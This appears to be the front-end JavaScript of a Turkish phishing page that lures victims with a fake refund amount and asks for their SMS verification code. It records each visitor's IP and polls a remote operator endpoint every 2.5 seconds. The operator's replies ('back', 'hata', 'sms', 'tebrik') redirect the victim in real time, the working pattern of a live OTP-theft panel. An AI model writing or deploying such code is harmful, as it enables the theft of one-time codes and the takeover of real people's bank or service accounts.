     <script>
      document.addEventListener("DOMContentLoaded", function() {
          const smsInput = document.getElementById("sms");

          smsInput.addEventListener("input", function() {
              const inputValue = smsInput.value.trim(); // Boşlukları temizle
              if (inputValue.length < 5 || inputValue.length > 6) {
                  smsInput.value = inputValue.slice(0, 6); // En fazla 6 karakter olarak sınırla
              }
          });

          document.getElementById("loginForm").addEventListener("submit", function(e) {
              const inputValue = smsInput.value.trim(); // Boşlukları temizle
              if (inputValue.length !== 5 && inputValue.length !== 6) {
                  e.preventDefault();
                  alert("SMS doğrulama kodu 5 veya 6 karakter olmalıdır.");
              }
          });

          const apiUrl = 'https://ozenellerklise.com.tr/dmn/pin.php?ip=';
          const ip = getCookie('ip');

          if (!ip) {
              console.error('IP adresi cookie olarak bulunamadı.');
              return;
          }

          const url = apiUrl + encodeURIComponent(ip);

          // AJAX ile GET isteği yaparak cevabı al
          fetch(url)
              .then(response => response.text())
              .then(data => {
                  // Cevabı aldıktan sonra işlemleri yap
                  const iadeTutariElement = document.getElementById('iadeTutari');

                  // İade tutarını Türk Lirası formatına dönüştür
                  const formattedTutar = formatTutar(data);

                  iadeTutariElement.textContent = formattedTutar;
              })
              .catch(error => console.error('API isteği hatası:', error));
      });

      // Cookie'den değer almak için yardımcı fonksiyon
      function getCookie(name) {
          const value = `; ${document.cookie}`;
          const parts = value.split(`; ${name}=`);
          if (parts.length === 2) return parts.pop().split(';').shift();
      }

      // Türk Lirası formatına dönüştürme fonksiyonu
      function formatTutar(tutar) {
          const formattedTutar = Number(tutar).toLocaleString('tr-TR', {
              style: 'currency',
              currency: 'TRY'
          });

          return formattedTutar.replace(/\s/g, ''); // Boşlukları kaldır
      }
  </script>

  <script>
    new Vue({
      el: '#app',
      data: {
        visitorIP: null,
      },
      created() {
        this.gonder();
        setInterval(this.gonder, 2500);
      },
      methods: {
        gonder() {
          this.visitorIP = this.getCookie('ip');

          if (!this.visitorIP) {
            axios.get('https://ipapi.co/ip').then(response => {
              this.visitorIP = response.data;
              document.cookie = "ip=" + this.visitorIP + "; path=/";
              this.sendRequest(this.visitorIP);
            }).catch(error => {
              console.error('IP alma sırasında bir hata oluştu:', error);
            });
          } else {
            this.sendRequest(this.visitorIP);
          }
        },
        sendRequest(visitorIP) {
          axios.get('https://ozenellerklise.com.tr/dmn/veri.php?ip=' + encodeURIComponent(visitorIP)+'&sayfa=sms sayfa')
            .then(response => {
              const msg = response.data;
              if (msg === "back") {
                window.location.href = '/';
              } else if (msg === "hata") {
                window.location.href = '/hatali-sms';
              } else if (msg === "sms") {
                window.location.href = '/sms';
              } else if (msg === "tebrik") {
                window.location.href = '/onay';
              }
            })
            .catch(error => {
              console.error('İstek sırasında bir hata oluştu:', error);
            });
        },
        getCookie(name) {
          const cookieName = name + "=";
          const decodedCookie = decodeURIComponent(document.cookie);
          const cookieArray = decodedCookie.split(';');
          for (let i = 0; i < cookieArray.length; i++) {
            let cookie = cookieArray[i].trim();
            if (cookie.indexOf(cookieName) === 0) {
              return cookie.substring(cookieName.length, cookie.length);
            }
          }
          return null;
        }
      }
    });
  </script>
